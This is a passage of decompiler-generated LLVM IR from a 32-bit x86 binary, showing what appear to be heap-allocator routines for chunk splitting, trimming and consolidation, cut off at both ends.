  %v2_80515d3 = add i32 %v1_80515d3, 32
  %v3_80515d3 = inttoptr i32 %v2_80515d3 to i32*
  store i32 %v3_80515d0, i32* %v3_80515d3, align 4
  br label %dec_label_pc_80515d6

dec_label_pc_80515d6:                             ; preds = %dec_label_pc_80515b9, %dec_label_pc_80515a8, %dec_label_pc_805158f, %dec_label_pc_805157e, %dec_label_pc_80515ca
  %v0_80515d9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80515d9 = add i32 %v0_80515d9, 8
  store i32 %v1_80515d9, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_80515e0 = call i32 @function_8051963(i32 %tmp6)
  br label %dec_label_pc_8051706

dec_label_pc_80515ea:                             ; preds = %dec_label_pc_80514ab, %dec_label_pc_8051561, %dec_label_pc_805152f
  %v1_80515fb = phi i32 [ %v1_805149b, %dec_label_pc_80514ab ], [ %v2_8051568, %dec_label_pc_8051561 ], [ %v0_80515ea.pre, %dec_label_pc_805152f ]
  %v5_80515ec = sub i32 %v1_80515fb, %.v1_8051488
  store i32 %v5_80515ec, i32* %ecx.global-to-local, align 4
  %tmp24 = icmp ult i32 %v5_80515ec, 16
  br i1 %tmp24, label %dec_label_pc_80515f5, label %dec_label_pc_8051607

dec_label_pc_80515f5:                             ; preds = %dec_label_pc_80515ea
  %v0_80515f5 = load i32, i32* @edi, align 4
  %v1_80515f5 = add i32 %v0_80515f5, 4
  %v2_80515f5 = inttoptr i32 %v1_80515f5 to i32*
  %v3_80515f5 = load i32, i32* %v2_80515f5, align 4
  %v1_80515f8 = urem i32 %v3_80515f5, 2
  %v2_80515fb = or i32 %v1_80515f8, %v1_80515fb
  store i32 %v2_80515fb, i32* %eax.global-to-local, align 4
  store i32 %v2_80515fb, i32* %v2_80515f5, align 4
  %v0_8051600 = load i32, i32* @edi, align 4
  %v1_8051600 = load i32, i32* @ebx, align 4
  %v2_8051600 = add i32 %v0_8051600, 4
  %v3_8051600 = add i32 %v2_8051600, %v1_8051600
  %v4_8051600 = inttoptr i32 %v3_8051600 to i32*
  %v5_8051600 = load i32, i32* %v4_8051600, align 4
  %v6_8051600 = or i32 %v5_8051600, 1
  store i32 %v6_8051600, i32* %v4_8051600, align 4
  br label %dec_label_pc_8051637

dec_label_pc_8051607:                             ; preds = %dec_label_pc_80515ea
  %v0_805160b = load i32, i32* @edi, align 4
  %v2_805160b = add i32 %v0_805160b, %.v1_8051488
  store i32 %v2_805160b, i32* %eax.global-to-local, align 4
  %v1_805160e = add i32 %v0_805160b, 4
  %v2_805160e = inttoptr i32 %v1_805160e to i32*
  %v3_805160e = load i32, i32* %v2_805160e, align 4
  %v1_8051611 = urem i32 %v3_805160e, 2
  %v5_8051614 = or i32 %v1_8051611, %.v1_8051488
  store i32 %v5_8051614, i32* %v2_805160e, align 4
  %v0_805161e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051620 = or i32 %v0_805161e, 1
  store i32 %v1_8051620, i32* @edx, align 4
  %v1_8051623 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051623 = add i32 %v1_8051623, 4
  %v3_8051623 = inttoptr i32 %v2_8051623 to i32*
  store i32 %v1_8051620, i32* %v3_8051623, align 4
  %v0_8051626 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051626 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051626 = add i32 %v0_8051626, 4
  %v3_8051626 = add i32 %v2_8051626, %v1_8051626
  %v4_8051626 = inttoptr i32 %v3_8051626 to i32*
  %v5_8051626 = load i32, i32* %v4_8051626, align 4
  %v6_8051626 = or i32 %v5_8051626, 1
  store i32 %v6_8051626, i32* %v4_8051626, align 4
  %v0_805162b = load i32, i32* %eax.global-to-local, align 4
  %v1_805162b = add i32 %v0_805162b, 8
  store i32 %v1_805162b, i32* %eax.global-to-local, align 4
  store i32 %v1_805162b, i32* %stack_var_-60, align 4
  %v1_805162f = call i32 @function_8051963(i32 %v1_805162b)
  store i32 %v1_805162f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051637

dec_label_pc_8051637:                             ; preds = %dec_label_pc_80515f5, %dec_label_pc_8051607
  %v0_8051637 = load i32, i32* @edi, align 4
  %v1_8051637 = add i32 %v0_8051637, 8
  store i32 %v1_8051637, i32* @ebx, align 4
  br label %dec_label_pc_8051713

dec_label_pc_805163f:                             ; preds = %dec_label_pc_8051478
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8051643 = load i32, i32* @global_var_805491c.39, align 4
  %v1_8051648 = add i32 %v0_8051643, -1
  store i32 %v1_8051648, i32* %eax.global-to-local, align 4
  %v2_805164d = inttoptr i32 %v1_8051493 to i32*
  %v3_805164d = load i32, i32* %v2_805164d, align 4
  store i32 %v3_805164d, i32* @ebp, align 4
  %v1_8051650 = or i32 %.v1_8051488, 4
  store i32 %v1_8051650, i32* %stack_var_-44, align 4
  %v2_8051656 = add i32 %v3_805164d, %v1_8051648
  store i32 %v2_8051656, i32* @edx, align 4
  %v1_8051659 = sub i32 0, %v0_8051643
  store i32 %v1_8051659, i32* %eax.global-to-local, align 4
  %v2_805165b = add i32 %v2_8051656, %v1_8051650
  %v2_805165e = and i32 %v2_805165b, %v1_8051659
  store i32 %v2_805165e, i32* @esi, align 4
  %v2_8051662 = sub i32 %v2_805165e, %v3_805164d
  store i32 %v2_8051662, i32* @ebx, align 4
  %v15_8051664 = icmp eq i32 %v1_805149b, %v2_8051662
  br i1 %v15_8051664, label %dec_label_pc_805170f, label %dec_label_pc_805166e

dec_label_pc_805166e:                             ; preds = %dec_label_pc_805163f
  %v2_8051675 = sub i32 %v1_8051493, %v3_805164d
  store i32 %v2_8051675, i32* @edi, align 4
  %v2_8051677 = add i32 %v3_805164d, %v1_805149b
  store i32 %v2_8051677, i32* %eax.global-to-local, align 4
  store i32 %v2_8051675, i32* %stack_var_-60, align 4
  %v6_805167b = inttoptr i32 %v2_8051675 to i32*
  %v7_805167b = call i32 @function_80527ee(i32* %v6_805167b, i32 %v2_8051677, i32 %v2_805165e, i32 1, i32 %v1_8051650, i32 %v1_805149b)
  store i32 %v7_805167b, i32* %eax.global-to-local, align 4
  %v10_8051683 = icmp eq i32 %v7_805167b, -1
  br i1 %v10_8051683, label %dec_label_pc_80516c7, label %dec_label_pc_8051688

dec_label_pc_8051688:                             ; preds = %dec_label_pc_805166e
  %v1_8051688 = load i32, i32* @ebp, align 4
  %v2_8051688 = add i32 %v1_8051688, %v7_805167b
  store i32 %v2_8051688, i32* @edx, align 4
  %v0_805168b = load i32, i32* @ebx, align 4
  %v1_805168b = or i32 %v0_805168b, 2
  store i32 %v1_805168b, i32* %ebx.global-to-local, align 4
  %v0_805168e = load i32, i32* @esi, align 4
  store i32 %v0_805168e, i32* %eax.global-to-local, align 4
  %v2_8051690 = add i32 %v2_8051688, 4
  %v3_8051690 = inttoptr i32 %v2_8051690 to i32*
  store i32 %v1_805168b, i32* %v3_8051690, align 4
  %v0_8051693 = load i32, i32* %eax.global-to-local, align 4
  %v5_8051693 = sub i32 %v0_8051693, %v1_805149b
  %v1_8051697 = load i32, i32* @global_var_8054924.44, align 4
  %v2_8051697 = add i32 %v1_8051697, %v5_8051693
  store i32 %v2_8051697, i32* %eax.global-to-local, align 4
  store i32 %v2_8051697, i32* @global_var_8054924.44, align 4
  %v1_80516a2 = load i32, i32* @global_var_8054930.45, align 16
  %tmp25 = icmp ugt i32 %v2_8051697, %v1_80516a2
  br i1 %tmp25, label %dec_label_pc_80516aa, label %dec_label_pc_80516af

dec_label_pc_80516aa:                             ; preds = %dec_label_pc_8051688
  store i32 %v2_8051697, i32* @global_var_8054930.45, align 16
  br label %dec_label_pc_80516af

dec_label_pc_80516af:                             ; preds = %dec_label_pc_8051688, %dec_label_pc_80516aa
  %v1_80516af = load i32, i32* @global_var_8054928.46, align 8
  %v2_80516af = add i32 %v1_80516af, %v2_8051697
  store i32 %v2_80516af, i32* %eax.global-to-local, align 4
  %v1_80516b5 = load i32, i32* @global_var_8054934.47, align 4
  %tmp26 = icmp ugt i32 %v2_80516af, %v1_80516b5
  br i1 %tmp26, label %dec_label_pc_80516bd, label %dec_label_pc_80516c2

dec_label_pc_80516bd:                             ; preds = %dec_label_pc_80516af
  store i32 %v2_80516af, i32* @global_var_8054934.47, align 4
  br label %dec_label_pc_80516c2

dec_label_pc_80516c2:                             ; preds = %dec_label_pc_80516af, %dec_label_pc_80516bd
  %v0_80516c2 = load i32, i32* @edx, align 4
  %v1_80516c2 = add i32 %v0_80516c2, 8
  store i32 %v1_80516c2, i32* @ebx, align 4
  br label %dec_label_pc_8051713

dec_label_pc_80516c7:                             ; preds = %dec_label_pc_805166e
  %v2_80516c7 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80516c7, i32* %eax.global-to-local, align 4
  %v10_80516ca = icmp ult i32 %v1_805149b, %v2_80516c7
  %v1_80516ce = icmp eq i1 %v10_80516ca, false
  br i1 %v1_80516ce, label %dec_label_pc_805170f, label %dec_label_pc_80516d0

dec_label_pc_80516d0:                             ; preds = %dec_label_pc_80516c7
  %v1_80516d7 = add i32 %.v1_8051488, -7
  store i32 %v1_80516d7, i32* %eax.global-to-local, align 4
  store i32 %v1_80516d7, i32* %stack_var_-60, align 4
  %v1_80516db = call i32 @function_8050b9e(i32 %v1_80516d7)
  store i32 %v1_80516db, i32* %eax.global-to-local, align 4
  store i32 %v1_80516db, i32* @ebx, align 4
  %v1_80516e5 = icmp eq i32 %v1_80516db, 0
  br i1 %v1_80516e5, label %dec_label_pc_805170b, label %dec_label_pc_80516e9

dec_label_pc_80516e9:                             ; preds = %dec_label_pc_80516d0
  %v1_80516ee = add i32 %v1_805149b, -8
  store i32 %v1_80516ee, i32* %eax.global-to-local, align 4
  store i32 %v1_80516db, i32* %stack_var_-60, align 4
  %v3_80516f7 = inttoptr i32 %v1_80516db to i16*
  %v4_80516f7 = call i32 @function_805298a(i16* %v3_80516f7, i32 %tmp6, i32 %v1_80516ee)
  store i32 %v4_80516f7, i32* %eax.global-to-local, align 4
  store i32 %v1_80516db, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8051701 = call i32 @function_8051963(i32 %tmp6)
  br label %dec_label_pc_8051706

dec_label_pc_8051706:                             ; preds = %dec_label_pc_80515d6, %dec_label_pc_80516e9
  %storemerge = phi i32 [ %v1_8051701, %dec_label_pc_80516e9 ], [ %v1_80515e0, %dec_label_pc_80515d6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051713

dec_label_pc_805170b:                             ; preds = %dec_label_pc_80516d0, %dec_label_pc_805153a
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051713

dec_label_pc_805170f:                             ; preds = %dec_label_pc_80516c7, %dec_label_pc_805163f, %dec_label_pc_80514d9
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_8051713

dec_label_pc_8051713:                             ; preds = %dec_label_pc_805170b, %dec_label_pc_8051706, %dec_label_pc_80516c2, %dec_label_pc_8051637, %dec_label_pc_805170f
  store i32 %v2_8051448, i32* @eax, align 4
  store i32 %v2_8051448, i32* %stack_var_-60, align 4
  %v2_805171c = call i32 @function_80520ca(i32 %v2_8051448, i32 1)
  store i32 %v2_805171c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051721

dec_label_pc_8051721:                             ; preds = %dec_label_pc_805142c, %dec_label_pc_8051418, %dec_label_pc_8051713
  br label %dec_label_pc_8051724

dec_label_pc_8051724:                             ; preds = %dec_label_pc_8051466, %dec_label_pc_8051721
  %v0_8051727 = load i32, i32* @ebx, align 4
  store i32 %v0_8051727, i32* %eax.global-to-local, align 4
  store i32 %v0_8051409, i32* @ebx, align 4
  store i32 %v0_8051408, i32* @esi, align 4
  store i32 %v0_8051407, i32* @edi, align 4
  store i32 %v0_8051406, i32* @ebp, align 4
  ret i32 %v0_8051727

; uselistorder directives
  uselistorder i32 %v1_80516db, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_80516af, { 1, 0, 2 }
  uselistorder i32 %v2_8051697, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8051675, { 1, 0, 2 }
  uselistorder i32 %v1_8051650, { 1, 0, 2 }
  uselistorder i32 %v3_805164d, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_805160b, { 1, 0 }
  uselistorder i32 %v1_8051571, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8051545, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_80514e9, { 1, 0, 2 }
  uselistorder i32 %v3_80514fc, { 0, 2, 1 }
  uselistorder i32 %v2_80514b9, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_805149b, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8051493, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_8051488, { 4, 12, 0, 1, 7, 8, 9, 2, 11, 3, 10, 5, 6 }
  uselistorder i32 %v1_8051478, { 0, 2, 1 }
  uselistorder i32 %v0_8051461, { 1, 0 }
  uselistorder i32 %v2_8051448, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 50, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_8051963, { 7, 6, 5, 4, 3, 10, 9, 8, 1, 0, 11, 2 }
  uselistorder i32 (i32)* @function_8050b9e, { 4, 3, 2, 0, 1, 5 }
  uselistorder label %dec_label_pc_8051724, { 1, 0 }
  uselistorder label %dec_label_pc_8051721, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051713, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051706, { 1, 0 }
  uselistorder label %dec_label_pc_80516c2, { 1, 0 }
  uselistorder label %dec_label_pc_80516af, { 1, 0 }
  uselistorder label %dec_label_pc_8051637, { 1, 0 }
  uselistorder label %dec_label_pc_80515ea, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80515d6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805152f, { 1, 0 }
}

define i32 @function_805172e() local_unnamed_addr {
dec_label_pc_805172e:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8051735 = load i32, i32* @edx, align 4
  store i32 %v0_8051735, i32* %ebp.global-to-local, align 4
  %v1_8051737 = add i32 %v0_8051735, 860
  %v2_8051737 = inttoptr i32 %v1_8051737 to i32*
  %v3_8051737 = load i32, i32* %v2_8051737, align 4
  store i32 %v3_8051737, i32* %ecx.global-to-local, align 4
  %v1_805173d = add i32 %v0_8051735, 44
  %v2_805173d = inttoptr i32 %v1_805173d to i32*
  %v3_805173d = load i32, i32* %v2_805173d, align 4
  %v1_8051740 = add i32 %v3_805173d, 4
  %v2_8051740 = inttoptr i32 %v1_8051740 to i32*
  %v3_8051740 = load i32, i32* %v2_8051740, align 4
  %v1_8051743 = and i32 %v3_8051740, -4
  store i32 %v1_8051743, i32* @esi, align 4
  %v1_8051748 = load i32, i32* @eax, align 4
  %v2_8051748 = add i32 %v3_8051737, -17
  %v2_805174a = add i32 %v2_8051748, %v1_8051743
  %v3_805174a = sub i32 %v2_805174a, %v1_8051748
  %div = udiv i32 %v3_805174a, %v3_8051737
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_805174a, %v3_8051737
  store i32 %tmp10, i32* @edx, align 4
  %v1_8051752 = add i32 %div, -1
  %v4_8051755 = mul i32 %v1_8051752, %v3_8051737
  store i32 %v4_8051755, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8051755, 1
  br i1 %tmp11, label %dec_label_pc_80517b3, label %dec_label_pc_805175c

dec_label_pc_805175c:                             ; preds = %dec_label_pc_805172e
  %v1_8051761 = call i32 @function_8052891(i32 0)
  store i32 %v1_8051761, i32* %edi.global-to-local, align 4
  %v0_8051768 = load i32, i32* @esi, align 4
  store i32 %v0_8051768, i32* %eax.global-to-local, align 4
  %v1_805176a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805176a = add i32 %v1_805176a, 44
  %v3_805176a = inttoptr i32 %v2_805176a to i32*
  %v4_805176a = load i32, i32* %v3_805176a, align 4
  %v5_805176a = add i32 %v4_805176a, %v0_8051768
  store i32 %v5_805176a, i32* %eax.global-to-local, align 4
  %v12_8051770 = icmp eq i32 %v1_8051761, %v5_805176a
  %v1_8051772 = icmp eq i1 %v12_8051770, false
  br i1 %v1_8051772, label %dec_label_pc_80517b3, label %dec_label_pc_8051774

dec_label_pc_8051774:                             ; preds = %dec_label_pc_805175c
  %v1_8051777 = sub i32 0, %v4_8051755
  store i32 %v1_8051777, i32* @ebx, align 4
  %v1_805177a = call i32 @function_8052891(i32 %v1_8051777)
  store i32 %v1_805177a, i32* %eax.global-to-local, align 4
  %v1_8051786 = call i32 @function_8052891(i32 0)
  store i32 %v1_8051786, i32* %eax.global-to-local, align 4
  %v10_805178e = icmp eq i32 %v1_8051786, -1
  br i1 %v10_805178e, label %dec_label_pc_80517b3, label %dec_label_pc_8051793

dec_label_pc_8051793:                             ; preds = %dec_label_pc_8051774
  %v0_8051793 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051795 = sub i32 %v0_8051793, %v1_8051786
  %v12_8051795 = icmp eq i32 %v2_8051795, 0
  store i32 %v2_8051795, i32* %ecx.global-to-local, align 4
  br i1 %v12_8051795, label %dec_label_pc_80517b3, label %dec_label_pc_8051799

dec_label_pc_8051799:                             ; preds = %dec_label_pc_8051793
  %v0_8051799 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051799 = add i32 %v0_8051799, 44
  %v2_8051799 = inttoptr i32 %v1_8051799 to i32*
  %v3_8051799 = load i32, i32* %v2_8051799, align 4
  store i32 %v3_8051799, i32* %eax.global-to-local, align 4
  %v1_805179c = add i32 %v0_8051799, 872
  %v2_805179c = inttoptr i32 %v1_805179c to i32*
  %v3_805179c = load i32, i32* %v2_805179c, align 4
  %v5_805179c = sub i32 %v3_805179c, %v2_8051795
  store i32 %v5_805179c, i32* %v2_805179c, align 4
  %v0_80517a2 = load i32, i32* @esi, align 4
  %v1_80517a2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80517a2 = sub i32 %v0_80517a2, %v1_80517a2
  %v1_80517a4 = or i32 %v2_80517a2, 1
  %v1_80517a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80517a7 = add i32 %v1_80517a7, 4
  %v3_80517a7 = inttoptr i32 %v2_80517a7 to i32*
  store i32 %v1_80517a4, i32* %v3_80517a7, align 4
  br label %dec_label_pc_80517b3

dec_label_pc_80517b3:                             ; preds = %dec_label_pc_805172e, %dec_label_pc_805175c, %dec_label_pc_8051774, %dec_label_pc_8051793, %dec_label_pc_8051799
  %storemerge = phi i32 [ 1, %dec_label_pc_8051799 ], [ 0, %dec_label_pc_8051793 ], [ 0, %dec_label_pc_8051774 ], [ 0, %dec_label_pc_805175c ], [ 0, %dec_label_pc_805172e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8051786, { 1, 0, 2 }
  uselistorder i32 %v4_8051755, { 1, 2, 0 }
  uselistorder i32 %v3_8051737, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8052891, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80517b3, { 4, 3, 2, 1, 0 }
}

define i32 @function_80517bb(i32* %arg1) local_unnamed_addr {
dec_label_pc_80517bb:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80517bc = load i32, i32* @edi, align 4
  %v0_80517bd = load i32, i32* @esi, align 4
  %v0_80517be = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80517c6 = load i32, i32* %arg1, align 4
  store i32 %v2_80517c6, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80517cd = icmp eq i32 %v2_80517c6, 0
  br i1 %v1_80517cd, label %dec_label_pc_80518e7.lr.ph, label %dec_label_pc_80517d5

dec_label_pc_80518e7.lr.ph:                       ; preds = %dec_label_pc_80517bb
  %v3_80518eb = add i32 %tmp20, 44
  br label %dec_label_pc_80518e7

dec_label_pc_80517d5:                             ; preds = %dec_label_pc_80517bb
  %v1_80517d9 = and i32 %v2_80517c6, -3
  store i32 %v1_80517d9, i32* %arg1, align 4
  %v1_80517de = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_80517e9 = add i32 %tmp20, 4
  store i32 %v1_80517e9, i32* %eax.global-to-local, align 4
  %v2_80517f4 = load i32, i32* %arg1, align 4
  %v2_80517fa = udiv i32 %v2_80517f4, 8
  %v2_80517fd = mul nuw i32 %v2_80517fa, 4
  %v3_80517fd = add i32 %tmp20, -4
  %v4_80517fd = add i32 %v3_80517fd, %v2_80517fd
  store i32 %v4_80517fd, i32* %eax.global-to-local, align 4
  %v2_80518c4 = add i32 %tmp20, 44
  %v3_80518c4 = inttoptr i32 %v2_80518c4 to i32*
  %v1_8051897 = add i32 %tmp20, 60
  %v2_8051897 = inttoptr i32 %v1_8051897 to i32*
  br label %dec_label_pc_8051805

dec_label_pc_8051805:                             ; preds = %dec_label_pc_80518d3, %dec_label_pc_80517d5
  %v0_8051813 = phi i32 [ %v1_80517e9, %dec_label_pc_80517d5 ], [ %v4_80518dd, %dec_label_pc_80518d3 ]
  store i32 %v0_8051813, i32* %eax.global-to-local, align 4
  %v1_8051809 = inttoptr i32 %v0_8051813 to i32*
  %v2_8051809 = load i32, i32* %v1_8051809, align 4
  store i32 %v2_8051809, i32* @ecx, align 4
  %v1_805180b = icmp eq i32 %v2_8051809, 0
  br i1 %v1_805180b, label %dec_label_pc_80518d3, label %dec_label_pc_8051813

dec_label_pc_8051813:                             ; preds = %dec_label_pc_8051805
  store i32 0, i32* %v1_8051809, align 4
  %v0_8051819.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051819

dec_label_pc_8051819:                             ; preds = %dec_label_pc_80518c7, %dec_label_pc_8051813
  %v0_8051836 = phi i32 [ %v3_8051819, %dec_label_pc_80518c7 ], [ %v0_8051819.pre, %dec_label_pc_8051813 ]
  %v1_8051819 = add i32 %v0_8051836, 8
  %v2_8051819 = inttoptr i32 %v1_8051819 to i32*
  %v3_8051819 = load i32, i32* %v2_8051819, align 4
  store i32 %v3_8051819, i32* %edx.global-to-local, align 4
  %v1_8051820 = add i32 %v0_8051836, 4
  %v2_8051820 = inttoptr i32 %v1_8051820 to i32*
  %v3_8051820 = load i32, i32* %v2_8051820, align 4
  store i32 %v3_8051820, i32* %eax.global-to-local, align 4
  %v1_8051825 = and i32 %v3_8051820, -2
  store i32 %v1_8051825, i32* @edi, align 4
  %v2_8051828 = urem i32 %v3_8051820, 2
  %v3_8051828 = icmp eq i32 %v2_8051828, 0
  %v2_805182a = add i32 %v1_8051825, %v0_8051836
  store i32 %v2_805182a, i32* @ebx, align 4
  %v1_805182d = add i32 %v2_805182a, 4
  %v2_805182d = inttoptr i32 %v1_805182d to i32*
  %v3_805182d = load i32, i32* %v2_805182d, align 4
  store i32 %v3_805182d, i32* %edx.global-to-local, align 4
  %v1_8051834 = icmp eq i1 %v3_8051828, false
  br i1 %v1_8051834, label %dec_label_pc_8051856, label %dec_label_pc_8051836

dec_label_pc_8051836:                             ; preds = %dec_label_pc_8051819
  %v1_8051836 = inttoptr i32 %v0_8051836 to i32*
  %v2_8051836 = load i32, i32* %v1_8051836, align 4
  store i32 %v2_8051836, i32* %ebp.global-to-local, align 4
  %v2_805183a = sub i32 %v0_8051836, %v2_8051836
  store i32 %v2_805183a, i32* %eax.global-to-local, align 4
  %v1_805183c = add i32 %v2_805183a, 8
  %v2_805183c = inttoptr i32 %v1_805183c to i32*
  %v3_805183c = load i32, i32* %v2_805183c, align 4
  store i32 %v3_805183c, i32* @esi, align 4
  %v1_805183f = add i32 %v2_805183a, 12
  %v2_805183f = inttoptr i32 %v1_805183f to i32*
  %v3_805183f = load i32, i32* %v2_805183f, align 4
  store i32 %v3_805183f, i32* %edx.global-to-local, align 4
  %v1_8051842 = add i32 %v3_805183c, 12
  %v2_8051842 = inttoptr i32 %v1_8051842 to i32*
  %v3_8051842 = load i32, i32* %v2_8051842, align 4
  store i32 %v3_8051842, i32* @ecx, align 4
  %v12_8051845 = icmp eq i32 %v3_8051842, %v2_805183a
  %v1_8051847 = icmp eq i1 %v12_8051845, false
  br i1 %v1_8051847, label %dec_label_pc_8051886, label %dec_label_pc_8051849

dec_label_pc_8051849:                             ; preds = %dec_label_pc_8051836
  %v1_8051849 = add i32 %v3_805183f, 8
  %v2_8051849 = inttoptr i32 %v1_8051849 to i32*
  %v3_8051849 = load i32, i32* %v2_8051849, align 4
  %v15_8051849 = icmp eq i32 %v3_8051849, %v3_8051842
  %v1_805184c = icmp eq i1 %v15_8051849, false
  br i1 %v1_805184c, label %dec_label_pc_8051886, label %dec_label_pc_805184e

dec_label_pc_805184e:                             ; preds = %dec_label_pc_8051849
  %v2_805184e = add i32 %v2_8051836, %v1_8051825
  store i32 %v2_805184e, i32* @edi, align 4
  store i32 %v3_805183f, i32* %v2_8051842, align 4
  %v0_8051853 = load i32, i32* @esi, align 4
  %v1_8051853 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051853 = add i32 %v1_8051853, 8
  %v3_8051853 = inttoptr i32 %v2_8051853 to i32*
  store i32 %v0_8051853, i32* %v3_8051853, align 4
  %v0_8051861.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051856

dec_label_pc_8051856:                             ; preds = %dec_label_pc_8051819, %dec_label_pc_805184e
  %v1_805186a = phi i32 [ %v2_805182a, %dec_label_pc_8051819 ], [ %v0_8051861.pre, %dec_label_pc_805184e ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_805185e = and i32 %v3_805182d, -4
  store i32 %v1_805185e, i32* %ebp.global-to-local, align 4
  %v4_8051861 = load i32, i32* %v3_80518c4, align 4
  %v15_8051861 = icmp eq i32 %v1_805186a, %v4_8051861
  br i1 %v15_8051861, label %dec_label_pc_80518b7, label %dec_label_pc_8051866

dec_label_pc_8051866:                             ; preds = %dec_label_pc_8051856
  %v2_8051866 = add i32 %v1_805186a, 4
  %v3_8051866 = add i32 %v2_8051866, %v1_805185e
  %v4_8051866 = inttoptr i32 %v3_8051866 to i32*
  %v5_8051866 = load i32, i32* %v4_8051866, align 4
  store i32 %v5_8051866, i32* %eax.global-to-local, align 4
  %v3_805186a = inttoptr i32 %v2_8051866 to i32*
  store i32 %v1_805185e, i32* %v3_805186a, align 4
  %v0_805186d = load i32, i32* %eax.global-to-local, align 4
  %v1_805186d = urem i32 %v0_805186d, 2
  %v2_805186d = icmp eq i32 %v1_805186d, 0
  store i32 %v1_805186d, i32* %eax.global-to-local, align 4
  %v1_8051872 = icmp eq i1 %v2_805186d, false
  br i1 %v1_8051872, label %dec_label_pc_8051893, label %dec_label_pc_8051874

dec_label_pc_8051874:                             ; preds = %dec_label_pc_8051866
  %v0_8051874 = load i32, i32* @ebx, align 4
  %v1_8051874 = add i32 %v0_8051874, 8
  %v2_8051874 = inttoptr i32 %v1_8051874 to i32*
  %v3_8051874 = load i32, i32* %v2_8051874, align 4
  store i32 %v3_8051874, i32* @edx, align 4
  %v1_8051877 = add i32 %v0_8051874, 12
  %v2_8051877 = inttoptr i32 %v1_8051877 to i32*
  %v3_8051877 = load i32, i32* %v2_8051877, align 4
  store i32 %v3_8051877, i32* %eax.global-to-local, align 4
  %v1_805187a = add i32 %v3_8051874, 12
  %v2_805187a = inttoptr i32 %v1_805187a to i32*
  %v3_805187a = load i32, i32* %v2_805187a, align 4
  store i32 %v3_805187a, i32* @esi, align 4
  %v12_805187d = icmp eq i32 %v3_805187a, %v0_8051874
  %v1_805187f = icmp eq i1 %v12_805187d, false
  br i1 %v1_805187f, label %dec_label_pc_8051886, label %dec_label_pc_8051881

dec_label_pc_8051881:                             ; preds = %dec_label_pc_8051874
  %v1_8051881 = add i32 %v3_8051877, 8
  %v2_8051881 = inttoptr i32 %v1_8051881 to i32*
  %v3_8051881 = load i32, i32* %v2_8051881, align 4
  %v15_8051881 = icmp eq i32 %v3_8051881, %v3_805187a
  br i1 %v15_8051881, label %dec_label_pc_805188b, label %dec_label_pc_8051886

dec_label_pc_8051886:                             ; preds = %dec_label_pc_8051881, %dec_label_pc_8051874, %dec_label_pc_8051849, %dec_label_pc_8051836
  %v0_8051886 = call i32 @function_8051aff()
  store i32 %v0_8051886, i32* %eax.global-to-local, align 4
  %v1_805188d.pre = load i32, i32* @edx, align 4
